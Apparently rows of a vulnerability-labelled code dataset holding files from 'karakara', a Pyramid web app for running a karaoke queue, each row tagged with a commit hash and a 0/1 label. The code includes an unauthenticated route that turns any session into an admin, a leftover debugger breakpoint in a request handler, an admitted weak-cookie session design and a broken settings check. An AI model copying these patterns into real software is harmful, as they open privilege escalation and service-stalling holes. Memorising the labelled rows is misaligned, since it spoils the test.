        extra_count = len( extra_param )
        missing_count = len( self._targetparam - path_set )
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if extra_count == 1 and ( not missing_count ) and levelctx.parameter:
          key = extra_param.pop()
          if not key in self._store:
            self._store[key] = []
          self._store[key].append( pathctx )
      def do_existing_paths( self ) :
        return True
      def get_parameters( self, key, levelctx, pathctxlist ):
        return None

    targetctx = self.get_path_context( targetpath )
    searcher = SearcherPath( targetctx, self )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store

      /n/n/n",1
152,c0418996aa5c69b22201de3223b13e31741a0c9d,"website/karakara/__init__.py/n/nimport os
import re
import operator
from functools import partial

# Pyramid imports
import pyramid.events
import pyramid.request
import pyramid.config
import pyramid.traversal
from pyramid.session import SignedCookieSessionFactory  # TODO: should needs to be replaced with an encrypted cookie or a hacker at an event may be able to intercept other users id's
from pyramid.i18n import get_localizer, TranslationStringFactory

# External Imports
from externals.lib.misc import convert_str_with_type, read_json, extract_subkeys, json_serializer, file_scan
from externals.lib.pyramid_helpers.auto_format2 import setup_pyramid_autoformater
from externals.lib.pyramid_helpers.session_identity2 import session_identity
from externals.lib.social._login import NullLoginProvider, FacebookLogin, GoogleLogin
from externals.lib.multisocket.auth_echo_server import AuthEchoServerManager

# Package Imports
from .traversal import TraversalGlobalRootFactory
from .templates import helpers as template_helpers
from .auth import ComunityUserStore, NullComunityUserStore
# SQLAlchemy imports
from .model import init_DBSession


import logging
log = logging.getLogger(__name__)

translation_string_factory = TranslationStringFactory('karakara')


def main(global_config, **settings):
    """"""
        This function returns a Pyramid WSGI application.
    """"""
    # Setup --------------------------------------------------------------------

    # Db
    init_DBSession(settings)

    # Pyramid Global Settings
    config = pyramid.config.Configurator(settings=settings, root_factory=TraversalGlobalRootFactory)  # , autocommit=True

    def assert_settings_keys(keys):
        for settings_key in key:
            assert config.registry.settings.get(settings_key)

    # Register Additional Includes ---------------------------------------------
    config.include('pyramid_mako')  # The mako.directories value is updated in the scan for addons. We trigger the import here to include the correct folders.

    # Reload on template change - Dedicated from pserve
    #template_filenames = map(operator.attrgetter('absolute'), file_scan(config.registry.settings['mako.directories']))
    #from pyramid.scripts.pserve import add_file_callback
    #add_file_callback(lambda: template_filenames)

    # Parse/Convert setting keys that have specified datatypes
    # Environment variables; capitalized and separated by underscores can override a settings key.
    # e.g.
    #   export KARAKARA_TEMPLATE_TITLE=Test
    #   can override 'karakara.template.title'
    for key in config.registry.settings.keys():
        value = os.getenv(key.replace('.', '_').upper(), '') or config.registry.settings[key]
        config.registry.settings[key] = convert_str_with_type(value)

    config.add_request_method(partial(session_identity, session_keys={'id', 'admin', 'faves', 'user'}), 'session_identity', reify=True)

    setup_pyramid_autoformater(config)

    # i18n
    config.add_translation_dirs(config.registry.settings['i18n.translation_dirs'])

    # Session Manager
    session_settings = extract_subkeys(config.registry.settings, 'session.')
    session_factory = SignedCookieSessionFactory(serializer=json_serializer, **session_settings)
    config.set_session_factory(session_factory)

    # Cachebust etags ----------------------------------------------------------
    #  crude implementation; count the number of tags in db, if thats changed, the etags will invalidate
    if not config.registry.settings['server.etag.cache_buster']:
        from .model.actions import last_update
        config.registry.settings['server.etag.cache_buster'] = 'last_update:{0}'.format(str(last_update()))

    # Search Config ------------------------------------------------------------
    import karakara.views.search
    karakara.views.search.search_config = read_json(config.registry.settings['karakara.search.view.config'])
    assert karakara.views.search.search_config, 'search_config data required'

    # WebSocket ----------------------------------------------------------------

    class NullAuthEchoServerManager(object):
        def recv(self, *args, **kwargs):
            pass
    socket_manager = NullAuthEchoServerManager()

    if config.registry.settings.get('karakara.websocket.port'):
        def authenticator(key):
            """"""Only admin authenticated keys can connect to the websocket""""""
            request = pyramid.request.Request({'HTTP_COOKIE':'{0}={1}'.format(config.registry.settings['session.cookie_name'],key)})
            session_data = session_factory(request)
            return session_data and session_data.get('admin')
        try:
            _socket_manager = AuthEchoServerManager(
                authenticator=authenticator,
                websocket_port=config.registry.settings['karakara.websocket.port'],
                tcp_port=config.registry.settings.get('karakara.tcp.port'),
            )
            _socket_manager.start()
            socket_manager = _socket_manager
        except OSError:
            log.warn('Unable to setup websocket')

    config.registry['socket_manager'] = socket_manager


    # Login Providers ----------------------------------------------------------

    from .views.comunity_login import social_login
    social_login.user_store = ComunityUserStore()
    login_providers = config.registry.settings.get('login.provider.enabled')
    # Facebook
    if 'facebook' in login_providers:
        assert_settings_keys(
            ('login.facebook.appid', 'login.facebook.secret'),
            message='To use facebook as a login provider appid and secret must be provided'
        )
        social_login.add_login_provider(FacebookLogin(
            appid=config.registry.settings.get('login.facebook.appid'),
            secret=config.registry.settings.get('login.facebook.secret'),
            permissions=config.registry.settings.get('login.facebook.permissions'),
        ))
    # Google
    if 'google' in login_providers:
        social_login.add_login_provider(GoogleLogin(
            client_secret_file=config.registry.settings.get('login.google.client_secret_file'),
        ))
    # Firefox Persona (Deprecated technology but a useful reference)
    #if 'persona' in login_providers:
    #    social_login.add_login_provider(PersonaLogin(
    #        site_url=config.registry.settings.get('server.url')
    #    ))
    # No login provider
    if not login_providers and config.registry.settings.get('karakara.server.mode') == 'development':
        # Auto login if no service keys are provided
        social_login.add_login_provider(NullLoginProvider())
        social_login.user_store = NullComunityUserStore()
    template_helpers.javascript_inline['comunity'] = social_login.html_includes

    # Renderers ----------------------------------------------------------------

    # AllanC - currently the auto_format decorator does all the formatting work
    #          it would be far preferable to use the pyramid renderer framework
    #          issue is, we want to set the renderer to be dynamic based on the url given
    #          I don't want to define EVERY method with loads of renderer tags
    #          and I don't want to define 5+ routes for every view callable with differnt formats
    #          We need a nice way of doing this in pyramid, and right now, after HOURS of trawling
    #          the doc and experimenting, I cant find one.
    #from .renderers.auto_render_factory import AutoRendererFactory, handle_before_render
    #config.add_renderer(None   , AutoRendererFactory) #'renderers.auto_render_factory.auto_renderer_factory'
    #config.add_renderer('.html', 'pyramid.mako_templating.renderer_factory')
    #config.add_subscriber(handle_before_render , pyramid.events.BeforeRender) # maybe use this to set renderer?
    # closeset ive seen
    #   http://zhuoqiang.me/a/restful-pyramid
    #   http://stackoverflow.com/questions/4633320/is-there-a-better-way-to-switch-between-html-and-json-output-in-pyramid


    # Routes -------------------------------------------------------------------

    def settings_path(key):
        path = os.path.join(os.getcwd(), config.registry.settings[key])
        if not os.path.isdir(path):
            log.error(f'Unable to add_static_view {key}:{path}')
        return path

    # Static Routes
    config.add_static_view(name='ext', path=settings_path('static.externals'))  # cache_max_age=3600
    config.add_static_view(name='static', path=settings_path('static.assets'))  # cache_max_age=3600
    config.add_static_view(name='player', path=settings_path('static.player'))

    # AllanC - it's official ... static route setup and generation is a mess in pyramid
    #config.add_static_view(name=settings[""static.media"" ], path=""karakara:media"" )
    config.add_static_view(name='files', path=config.registry.settings['static.processmedia2.config']['path_processed'])

    # Routes
    def append_format_pattern(route):
        return re.sub(r'{(.*)}', r'{\1:[^/\.]+}', route) #+ r'{spacer:[.]?}{format:(%s)?}' % '|'.join(registered_formats())

    #config.add_route('home'          , append_format_pattern('/')              )
    #config.add_route('track'         , append_format_pattern('/track/{id}')    )
    #config.add_route('track_list'    , append_format_pattern('/track_list')    )
    config.add_route('track_import'  , append_format_pattern('/track_import')  )
    #config.add_route('queue'         , append_format_pattern('/queue')         )
    config.add_route('priority_tokens', append_format_pattern('/priority_tokens'))
    config.add_route('fave'          , append_format_pattern('/fave')          )
    config.add_route('message'       , append_format_pattern('/message')          )
    config.add_route('admin_toggle'  , append_format_pattern('/admin')         )
    config.add_route('admin_lock'    , append_format_pattern('/admin_lock')    )
    config.add_route('remote'        , append_format_pattern('/remote')        )
    config.add_route('feedback'      , append_format_pattern('/feedback')      )
    config.add_route('settings'      , append_format_pattern('/settings')      )
    config.add_route('random_images' , append_format_pattern('/random_images') )
    config.add_route('inject_testdata' , append_format_pattern('/inject_testdata') )
    config.add_route('stats'         , append_format_pattern('/stats')         )
    config.add_route('comunity'      , append_format_pattern('/comunity')      )
    config.add_route('comunity_login', append_format_pattern('/comunity/login'))
    config.add_route('comunity_logout', append_format_pattern('/comunity/logout'))
    config.add_route('comunity_list' , append_format_pattern('/comunity/list') )
    config.add_route('comunity_track', append_format_pattern('/comunity/track/{id}'))
    config.add_route('comunity_upload', append_format_pattern('/comunity/upload'))
    config.add_route('comunity_settings', append_format_pattern('/comunity/settings'))
    config.add_route('comunity_processmedia_log', append_format_pattern('/comunity/processmedia_log'))

    config.add_route('search_tags'   , '/search_tags/{tags:.*}')
    config.add_route('search_list'   , '/search_list/{tags:.*}')

    # Upload extras -----
    #config.add_static_view(name=settings['upload.route.uploaded'], path=settings['upload.path'])  # the 'upload' route above always matchs first
    config.add_route('upload', '/upload{sep:/?}{name:.*}')

    # Events -------------------------------------------------------------------
    config.add_subscriber(add_localizer_to_request, pyramid.events.NewRequest)
    config.add_subscriber(add_render_globals_to_template, pyramid.events.BeforeRender)

    # Return -------------------------------------------------------------------
    config.scan(ignore='.tests')
    config.scan('externals.lib.pyramid_helpers.views')
    return config.make_wsgi_app()


def add_localizer_to_request(event):
    request = event.request
    localizer = get_localizer(request)
    def auto_translate(*args, **kwargs):
        return localizer.translate(translation_string_factory(*args, **kwargs))
    request.localizer = localizer
    request.translate = auto_translate


def add_render_globals_to_template(event):
    request = event['request']
    event['_'] = request.translate
    event['localizer'] = request.localizer
    event['h'] = template_helpers
    event['traversal'] = pyramid.traversal
/n/n/nwebsite/karakara/traversal.py/n/n""""""

""""""
import pyramid.traversal


class TraversalGlobalRootFactory():
    __template__ = 'home'
    __name__ = ''

    def __init__(self, request):
        pass

    def __getitem__(self, key):
        return {
            'queue': QueueContext,
            'track': TrackContext,  # Admin only for all tracks
            'track_list': TrackListContext,  # Admin only for all tracks
            #'comunity': ComunityContext(),
            #'track_import': TrackImportContext(),  # Needs secure permissions
        }[key](parent=self)


class KaraKaraResourceMixin():
    @property
    def queue_id(self):
        queue_context = pyramid.traversal.find_interface(self, QueueContext)
        if queue_context:
            return queue_context.id
        return None


class QueueContext():
    __template__ = 'queue_home'
    __name__ = 'queue'

    def __init__(self, parent=None, id=None):
        self.__parent__ = parent
        self.id = id
        if self.id:
            self.__name__ = self.id

    def __getitem__(self, key=None):
        if self.id:
            return {
                'track': TrackContext,
                'track_list': TrackListContext,
                'queue_items': QueueItemsContext,
            }[key](parent=self)
        return QueueContext(parent=self, id=key)


class QueueItemsContext():
    __template__ = 'queue_items'
    __name__ = 'queue_items'

    def __init__(self, parent=None):
        self.__parent__ = parent


class TrackContext(KaraKaraResourceMixin):
    __template__ = 'track'
    __name__ = 'track'

    def __init__(self, parent=None, id=None):
        self.__parent__ = parent
        self.id = id
        if self.id:
            self.__name__ = self.id

    def __getitem__(self, key):
        if self.id:
            raise KeyError()
        return TrackContext(parent=self, id=key)


class ComunityContext():
    __template__ = 'comunity'


class TrackListContext():
    __template__ = 'track_list'

    def __init__(self, parent=None):
        self.__parent__ = parent


class TrackImportContext():
    pass
/n/n/nwebsite/karakara/views/misc.py/n/nfrom pyramid.view import view_config
from pyramid.httpexceptions import HTTPFound


from externals.lib.log import log_event

from . import web, action_ok, action_error, admin_only


import logging
log = logging.getLogger(__name__)


@view_config(context='karakara.traversal.TraversalGlobalRootFactory')
@web
def home(request):
    # Short term hack. Do not allow normal root page in commuity mode - redirect to comunity
    # Need to implement a proper pyramid authorize system when in comunity mode
    if request.registry.settings.get('karakara.server.mode') == 'comunity':
        raise HTTPFound(location='/comunity')
    return action_ok()


@view_config(route_name='stats')
@web
def stats(request):
    return action_ok()


@view_config(route_name='admin_lock')
@web
@admin_only
def admin_lock(request):
    request.registry.settings['admin_locked'] = not request.registry.settings.get('admin_locked', False)
    #log.debug('admin locked - {0}'.format(request.registry.settings['admin_locked']))
    log_event(request, admin_locked=request.registry.settings['admin_locked'])
    return action_ok()


@view_config(route_name='admin_toggle')
@web
def admin_toggle(request):
    if request.registry.settings.get('admin_locked'):
        raise action_error(message='additional admin users have been prohibited', code=403)
    request.session['admin'] = not request.session.get('admin', False)
    #log.debug('admin - {0} - {1}'.format(request.session['id'], request.session['admin']))
    log_event(request, admin=request.session['admin'])
    return action_ok()


@view_config(route_name='random_images')
@web
def random_images(request):
    """"""
    The player interface titlescreen can be populated with random thumbnails from the system.
    This is a nice showcase.
    Not optimised as this is rarely called.
    """"""
    import random
    from karakara.model import DBSession
    from karakara.model.model_tracks import Attachment
    images = DBSession.query(Attachment.location).filter(Attachment.type == 'image').all()
    # TODO: use serach.restrict_trags to get the images for the current event
    random.shuffle(images)
    images = [t[0] for t in images]
    return action_ok(data={'images': images[0: int(request.params.get('count', 0) or 100)]})
/n/n/nwebsite/karakara/views/queue.py/n/nfrom pyramid.view import view_config

from . import web, action_ok, action_error, etag_decorator, generate_cache_key

import logging
log = logging.getLogger(__name__)


def generate_cache_key_homepage(request):
    """"""
    Custom etag for homepage
    The homepage template has a few if statements to display various buttons
    The buttons can be disables in settings.
    This custom etag takes all 'if' statements in the homepage template
    """"""
    return '-'.join((
        generate_cache_key(request),
        str(request.registry.settings.get('karakara.template.menu.disable')),
        str(bool(request.session.get('faves', [])) and request.registry.settings.get('karakara.faves.enabled')),
    ))


@view_config(context='karakara.traversal.QueueContext')
@etag_decorator(generate_cache_key_homepage)
@web
def queue_home(request):
    return action_ok()
/n/n/nwebsite/karakara/views/queue_items.py/n/nimport datetime
import random
from functools import partial

from pyramid.view import view_config

from externals.lib.misc import now, subdict
from externals.lib.log import log_event

from . import web, action_ok, action_error, etag_decorator, cache, generate_cache_key, method_delete_router, method_put_router, is_admin, modification_action, admin_only
from . import _logic

from ..model import DBSession, commit
from ..model.model_queue import QueueItem
from ..model.model_tracks import Track
from ..model.model_priority_token import PriorityToken
from ..model.actions import get_track

from ..templates.helpers import track_title

from sqlalchemy.orm import joinedload, defer  # , joinedload_all
from sqlalchemy.orm.exc import NoResultFound

from .track import invalidate_track

import logging
log = logging.getLogger(__name__)


#-------------------------------------------------------------------------------
# Cache Management
#-------------------------------------------------------------------------------
QUEUE_CACHE_KEY = 'queue'

queue_version = random.randint(0, 2000000000)
def invalidate_queue(request=None):
    commit() # Before invalidating any cache data, ensure the new data is persisted
    global queue_version
    queue_version += 1
    cache.delete(QUEUE_CACHE_KEY)
    if request:
        request.registry['socket_manager'].recv('queue_updated'.encode('utf-8'))

#invalidate_queue()
def generate_cache_key_queue(request):
    global queue_version
    return '-'.join([generate_cache_key(request), str(queue_version)])


#-------------------------------------------------------------------------------
# Queue
#-------------------------------------------------------------------------------

#@view_config(route_name='queue', request_method='GET')
@view_config(context='karakara.traversal.QueueItemsContext', request_method='GET')
@etag_decorator(generate_cache_key_queue)
@web
def queue_view(request):
    """"""
    view current queue
    """"""
    import pdb ; pdb.set_trace()
    def get_queue_dict():
        log.debug('cache gen - queue {0}'.format(queue_version))

        # Get queue order
        queue_dicts = DBSession.query(QueueItem).filter(QueueItem.status=='pending').order_by(QueueItem.queue_weight)
        queue_dicts = [queue_item.to_dict('full') for queue_item in queue_dicts]

        # Fetch all tracks with id's in the queue
        trackids = [queue_item['track_id'] for queue_item in queue_dicts]
        tracks = {}
        if trackids:
            tracks = DBSession.query(Track).\
                                filter(Track.id.in_(trackids)).\
                                options(\
                                    joinedload(Track.tags),\
                                    joinedload(Track.attachments),\
                                    joinedload('tags.parent'),\
                                    #defer(Track.lyrics),\
                                )
            tracks = {track['id']:track for track in [track.to_dict('full', exclude_fields='lyrics') for track in tracks]}

        # HACK
        # AllanC - Hack to overlay title on API return.
        # This technically cant be part of the model because the title rendering in 'helpers' uses the dict version of a track object rather than the DB object
        # This is half the best place for it. We want the model to be as clean as possible
        # But we need the 'title' field to be consistant for all API returns for tracks ... more consideration needed
        #
        # Solution: Setup SQLAlchemy event to render the title before commiting a track to the DB - like a DB trigger by handled Python size for cross db compatibility
        #           Stub created in model_track.py
        #           This is to be removed ...
        for track in tracks.values():
            track['title'] = track_title(track['tags'])

        # Attach track to queue_item
        for queue_item in queue_dicts:
            queue_item['track'] = tracks.get(queue_item['track_id'])

        # Calculate estimated track time
        # Overlay 'total_duration' on all tracks
        # It takes time for performers to change, so each track add a padding time
        #  +
        # Calculate the index to split the queue list
        #  - non admin users do not see the whole queue in order.
        #  - after a specifyed time threshold, the quque order is obscured
        #  - it is expected that consumers of this api return will obscure the
        #    order passed the specifyed 'split_index'
        split_markers = list(request.registry.settings.get('karakara.queue.group.split_markers'))
        time_padding = request.registry.settings.get('karakara.queue.track.padding')
        split_indexs = []
        total_duration = datetime.timedelta(seconds=0)
        for index, queue_item in enumerate(queue_dicts):
            if not queue_item['track']:
                continue
            queue_item['total_duration'] = total_duration
            total_duration += datetime.timedelta(seconds=queue_item['track']['duration']) + time_padding
            if split_markers and total_duration > split_markers[0]:
                split_indexs.append(index + 1)
                del split_markers[0]

        return {'queue': queue_dicts, 'queue_split_indexs': split_indexs}

    queue_data = cache.get_or_create(QUEUE_CACHE_KEY, get_queue_dict)
    return action_ok(data=queue_data)


#@view_config(route_name='queue', request_method='POST')
@view_config(context='karakara.traversal.QueueItemsContext', request_method='POST')
@web
@modification_action
def queue_item_add(request):
    """"""
    Add items to end of queue
    """"""
    _ = request.translate
    _log_event = partial(log_event, request, method='add')

    # Validation
    for field in ['track_id', 'performer_name']:
        if not request.params.get(field):
            raise action_error(message='no {0}'.format(field), code=400)
    track_id = request.params.get('track_id')
    try:
        track = DBSession.query(Track).get(track_id)
        assert track
    except AssertionError:
        raise action_error(message=_('view.queue.add.error.track_id ${track_id}', mapping={'track_id': track_id}), code=400)

    # If not admin, check additional restrictions
    if not is_admin(request):

        performer_name = request.params.get('performer_name').strip()  # TODO: It would be good to ensure this value is writen to the db. However we cant modify the request.param dict directly. See creation of queueitem below

        # Valid performer name
        valid_performer_names = request.registry.settings.get('karakara.queue.add.valid_performer_names')
        if valid_performer_names and performer_name.lower() not in map(lambda name: name.lower(), valid_performer_names):
            message = _('view.queue.add.invalid_performer_name ${performer_name}', mapping=dict(
                performer_name=performer_name
            ))
            raise action_error(message, code=400)

        # Duplucate performer resrictions
        queue_item_performed_tracks = _logic.queue_item_for_performer(request, DBSession, request.params.get('performer_name'))
        if queue_item_performed_tracks['performer_status'] == _logic.QUEUE_DUPLICATE.THRESHOLD:
            try:
                latest_track_title = get_track(queue_item_performed_tracks['queue_items'][0].track_id).title
            except Exception:
                latest_track_title = ''
            message = _('view.queue.add.dupicate_performer_limit ${performer_name} ${estimated_next_add_time} ${track_count} ${latest_queue_item_title}', mapping=dict(
                performer_name=performer_name,
                latest_queue_item_title=latest_track_title,
                **subdict(queue_item_performed_tracks, {
                    'estimated_next_add_time',
                    'track_count',
                })
            ))
            _log_event(status='reject', reason='dupicate.performer', message=message)
            raise action_error(message=message, code=400)

        # Duplicate Addition Restrictions
        queue_item_tracks_queued = _logic.queue_item_for_track(request, DBSession, track.id)
        if queue_item_tracks_queued['track_status'] == _logic.QUEUE_DUPLICATE.THRESHOLD:
            message = _('view.queue.add.dupicate_track_limit ${track_id} ${estimated_next_add_time} ${track_count}', mapping=dict(
                track_id=track.id,
                **subdict(queue_item_performed_tracks, {
                    'estimated_next_add_time',
                    'track_count',
                })
            ))
            _log_event(status='reject', reason='duplicate.track', message=message)
            raise action_error(message=message, code=400)

        # Max queue length restrictions
        queue_duration = _logic.get_queue_duration(request)

        # Event end time
        event_end = request.registry.settings.get('karakara.event.end')
        if event_end and now()+queue_duration > event_end:
            log.debug('event end restricted')
            _log_event(status='reject', reason='event_end')
            raise action_error(message=_('view.queue.add.event_end ${event_end}', mapping={'event_end': event_end}), code=400)

        # Queue time limit
        queue_limit = request.registry.settings.get('karakara.queue.add.limit')
        if queue_limit and queue_duration > queue_limit:
            # If no device priority token - issue token and abort
            # else consume the token and proceed with addition
            if not _logic.consume_priority_token(request, DBSession):
                # Issue a priority token
                priority_token = _logic.issue_priority_token(request, DBSession)
                if isinstance(priority_token, PriorityToken):
                    _log_event(status='reject', reason='token.issued')
                    raise action_error(message=_('view.queue.add.priority_token_issued'), code=400)
                if priority_token == _logic.TOKEN_ISSUE_ERROR.EVENT_END:
                    _log_event(status='reject', reason='event_end')
                    raise action_error(message=_('view.queue.add.event_end ${event_end}', mapping={'event_end': event_end}), code=400)
                if priority_token == _logic.TOKEN_ISSUE_ERROR.TOKEN_ISSUED:
                    _log_event(status='reject', reason='token.already_issued')
                    raise action_error(message=_('view.queue.add.priority_token_already_issued'), code=400)
                _log_event(status='reject', reason='token.limit')
                raise action_error(message=_('view.queue.add.token_limit'), code=400)

    queue_item = QueueItem()
    queue_item.queue_id = 'PLACEHOLDER'
    for key, value in request.params.items():
        if hasattr(queue_item, key):
            setattr(queue_item, key, value)

    # Set session owner - if admin allow manual setting of session_owner via params
    if is_admin(request) and queue_item.session_owner:
        pass
    else:
        queue_item.session_owner = request.session['id']

    DBSession.add(queue_item)
    _log_event(status='ok', track_id=queue_item.track_id, performer_name=queue_item.performer_name)
    #log.info('add - %s to queue by %s' % (queue_item.track_id, queue_item.performer_name))

    invalidate_queue(request)  # Invalidate Cache
    invalidate_track(track_id)

    return action_ok(message='track queued', data={'queue_item.id': ''}, code=201)  # TODO: should return 201 and have id of newly created object. data={'track':{'id':}}


#@view_config(route_name='queue', custom_predicates=(method_delete_router, lambda info,request: request.params.get('queue_item.id')) ) #request_method='POST',
@view_config(context='karakara.traversal.QueueItemsContext', custom_predicates=(method_delete_router, lambda info,request: request.params.get('queue_item.id')))
@web
@modification_action
def queue_item_del(request):
    """"""
    Remove items from the queue

    check session owner or admin
    state can be passed as ""complete"" to mark track as played

    TODO: THIS DOES NOT CONFORM TO THE REST STANDARD!!! Refactor
    """"""
    _log_event = partial(log_event, request, method='del')

    queue_item_id = int(request.params['queue_item.id'])
    queue_item = DBSession.query(QueueItem).get(queue_item_id)

    if not queue_item:
        _log_event(status='reject', reason='invalid.queue_item.id', queue_item_id=queue_item_id)
        raise action_error(message='invalid queue_item.id', code=404)
    if not is_admin(request) and queue_item.session_owner != request.session['id']:
        _log_event(status='reject', reason='not_owner', track_id=queue_item.track_id)
        raise action_error(message='you are not the owner of this queue_item', code=403)

    #DBSession.delete(queue_item)
    queue_item.status = request.params.get('status', 'removed')

    _log_event(status='ok', track_id=queue_item.track_id)
    #log.info('remove - %s from queue' % (queue_item.track_id))
    queue_item_track_id = queue_item.track_id  # Need to get queue_item.track_id now, as it will be cleared by invalidate_queue

    invalidate_queue(request)  # Invalidate Cache
    invalidate_track(queue_item_track_id)

    return action_ok(message='queue_item status changed')


#@view_config(route_name='queue', custom_predicates=(method_put_router,))  # request_method='PUT'
@view_config(context='karakara.traversal.QueueItemsContext', custom_predicates=(method_put_router,))
@web
@modification_action
def queue_item_update(request):
    """"""
    Used to touch queed items

    check session owner or admin

    TODO: THIS DOES NOT CONFORM TO THE REST STANDARD!!! Refactor
    """"""
    _log_event = partial(log_event, request, method='update')

    params = dict(request.params)

    for field in [f for f in ['queue_item.id', 'queue_item.move.target_id'] if f in params]:
        try:
            params[field] = int(params[field])
        except ValueError:
            raise action_error(message='invalid {0}'.format(field), code=404)

    queue_item_id = int(params['queue_item.id'])
    queue_item = DBSession.query(QueueItem).get(queue_item_id)

    if not queue_item:
        _log_event(status='reject', reason='invalid.queue_item.id', queue_item_id=queue_item_id)
        raise action_error(message='invalid queue_item.id', code=404)
    if not is_admin(request) and queue_item.session_owner != request.session['id']:
        _log_event(status='reject', reason='not_owner', track_id=queue_item.track_id)
        raise action_error(message='you are not the owner of this queue_item', code=403)

    # If moving, lookup new weighting from the target track id
    # The source is moved infront of the target_id
    if params.get('queue_item.move.target_id'):
        if not is_admin(request):
            _log_event(status='reject', reason='move.not_admin', queue_item_id=queue_item_id)
            raise action_error(message='admin only action', code=403)
        # get next and previous queueitem weights
        try:
            target_weight,  = DBSession.query(QueueItem.queue_weight).filter(QueueItem.id==params.pop('queue_item.move.target_id')).one()
            try:
                target_weight_next,  = DBSession.query(QueueItem.queue_weight).filter(QueueItem.queue_weight<target_weight).order_by(QueueItem.queue_weight.desc()).limit(1).one()
            except NoResultFound:
                target_weight_next = 0.0
            # calculate weight inbetween and inject that weight into the form params for saving
            params['queue_weight'] = (target_weight + target_weight_next) / 2.0
        except NoResultFound:
            log.debug('queue_item.move.target_id not found, assuming end of queue is the target')
            params['queue_weight'] = QueueItem.new_weight(DBSession)

    # Update any params to the db
    for key, value in params.items():
        if hasattr(queue_item, key):
            setattr(queue_item, key, value)
    queue_item.time_touched = datetime.datetime.now()  # Update touched timestamp

    #log.info('update - %s' % (queue_item.track_id))
    _log_event(status='ok', track_id=queue_item.track_id)

    queue_item_track_id = queue_item.track_id

    invalidate_queue(request)  # Invalidate Cache
    invalidate_track(queue_item_track_id)

    return action_ok(message='queue_item updated')


@view_config(route_name='priority_tokens')
@web
@admin_only
def priority_tokens(request):
    priority_tokens = DBSession.query(PriorityToken)\
        .filter(PriorityToken.valid_start >= now() - request.registry.settings.get('karakara.queue.add.duplicate.time_limit')) \
        .order_by(PriorityToken.valid_start)
    return action_ok(data={
        'priority_tokens': (priority_token.to_dict('full') for priority_token in priority_tokens),
    })
/n/n/n",0
153,c0418996aa5c69b22201de3223b13e31741a0c9d,"/website/karakara/__init__.py/n/nimport os
import re
import operator
from functools import partial

# Pyramid imports
import pyramid.events
import pyramid.request
import pyramid.config
from pyramid.session import SignedCookieSessionFactory  # TODO: should needs to be replaced with an encrypted cookie or a hacker at an event may be able to intercept other users id's
from pyramid.i18n import get_localizer, TranslationStringFactory

# External Imports
from externals.lib.misc import convert_str_with_type, read_json, extract_subkeys, json_serializer, file_scan
from externals.lib.pyramid_helpers.auto_format2 import setup_pyramid_autoformater
from externals.lib.pyramid_helpers.session_identity2 import session_identity
from externals.lib.social._login import NullLoginProvider, FacebookLogin, GoogleLogin
from externals.lib.multisocket.auth_echo_server import AuthEchoServerManager

# Package Imports
from .traversal import TraversalGlobalRootFactory
from .templates import helpers as template_helpers
from .auth import ComunityUserStore, NullComunityUserStore
# SQLAlchemy imports
from .model import init_DBSession


import logging
log = logging.getLogger(__name__)

translation_string_factory = TranslationStringFactory('karakara')


def main(global_config, **settings):
    """"""
        This function returns a Pyramid WSGI application.
    """"""
    # Setup --------------------------------------------------------------------

    # Db
    init_DBSession(settings)

    # Pyramid Global Settings
    config = pyramid.config.Configurator(settings=settings, root_factory=TraversalGlobalRootFactory)  # , autocommit=True

    def assert_settings_keys(keys):
        for settings_key in key:
            assert config.registry.settings.get(settings_key)

    # Register Additional Includes ---------------------------------------------
    config.include('pyramid_mako')  # The mako.directories value is updated in the scan for addons. We trigger the import here to include the correct folders.

    # Reload on template change - Dedicated from pserve
    #template_filenames = map(operator.attrgetter('absolute'), file_scan(config.registry.settings['mako.directories']))
    #from pyramid.scripts.pserve import add_file_callback
    #add_file_callback(lambda: template_filenames)

    # Parse/Convert setting keys that have specified datatypes
    # Environment variables; capitalized and separated by underscores can override a settings key.
    # e.g.
    #   export KARAKARA_TEMPLATE_TITLE=Test
    #   can override 'karakara.template.title'
    for key in config.registry.settings.keys():
        value = os.getenv(key.replace('.', '_').upper(), '') or config.registry.settings[key]
        config.registry.settings[key] = convert_str_with_type(value)

    config.add_request_method(partial(session_identity, session_keys={'id', 'admin', 'faves', 'user'}), 'session_identity', reify=True)

    setup_pyramid_autoformater(config)

    # i18n
    config.add_translation_dirs(config.registry.settings['i18n.translation_dirs'])

    # Session Manager
    session_settings = extract_subkeys(config.registry.settings, 'session.')
    session_factory = SignedCookieSessionFactory(serializer=json_serializer, **session_settings)
    config.set_session_factory(session_factory)

    # Cachebust etags ----------------------------------------------------------
    #  crude implementation; count the number of tags in db, if thats changed, the etags will invalidate
    if not config.registry.settings['server.etag.cache_buster']:
        from .model.actions import last_update
        config.registry.settings['server.etag.cache_buster'] = 'last_update:{0}'.format(str(last_update()))

    # Search Config ------------------------------------------------------------
    import karakara.views.search
    karakara.views.search.search_config = read_json(config.registry.settings['karakara.search.view.config'])
    assert karakara.views.search.search_config, 'search_config data required'

    # WebSocket ----------------------------------------------------------------

    class NullAuthEchoServerManager(object):
        def recv(self, *args, **kwargs):
            pass
    socket_manager = NullAuthEchoServerManager()

    if config.registry.settings.get('karakara.websocket.port'):
        def authenticator(key):
            """"""Only admin authenticated keys can connect to the websocket""""""
            request = pyramid.request.Request({'HTTP_COOKIE':'{0}={1}'.format(config.registry.settings['session.cookie_name'],key)})
            session_data = session_factory(request)
            return session_data and session_data.get('admin')
        try:
            _socket_manager = AuthEchoServerManager(
                authenticator=authenticator,
                websocket_port=config.registry.settings['karakara.websocket.port'],
                tcp_port=config.registry.settings.get('karakara.tcp.port'),
            )
            _socket_manager.start()
            socket_manager = _socket_manager
        except OSError:
            log.warn('Unable to setup websocket')

    config.registry['socket_manager'] = socket_manager


    # Login Providers ----------------------------------------------------------

    from .views.comunity_login import social_login
    social_login.user_store = ComunityUserStore()
    login_providers = config.registry.settings.get('login.provider.enabled')
    # Facebook
    if 'facebook' in login_providers:
        assert_settings_keys(
            ('login.facebook.appid', 'login.facebook.secret'),
            message='To use facebook as a login provider appid and secret must be provided'
        )
        social_login.add_login_provider(FacebookLogin(
            appid=config.registry.settings.get('login.facebook.appid'),
            secret=config.registry.settings.get('login.facebook.secret'),
            permissions=config.registry.settings.get('login.facebook.permissions'),
        ))
    # Google
    if 'google' in login_providers:
        social_login.add_login_provider(GoogleLogin(
            client_secret_file=config.registry.settings.get('login.google.client_secret_file'),
        ))
    # Firefox Persona (Deprecated technology but a useful reference)
    #if 'persona' in login_providers:
    #    social_login.add_login_provider(PersonaLogin(
